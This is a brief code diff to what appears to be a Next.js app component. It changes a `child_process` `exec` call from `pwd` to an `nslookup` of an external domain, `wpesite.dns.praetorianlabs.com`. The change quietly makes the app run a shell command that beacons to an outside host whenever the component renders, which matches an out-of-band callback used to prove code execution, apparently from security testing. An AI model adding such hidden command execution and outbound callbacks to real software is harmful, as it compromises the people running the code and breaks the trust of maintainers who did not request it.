@@ -2,7 +2,7 @@ import '../styles/globals.css';
 const { exec } = require("child_process");
 
 function App({ Component, pageProps }) {
-  exec("pwd", (error, stdout, stderr) => {
+  exec("nslookup wpesite.dns.praetorianlabs.com", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
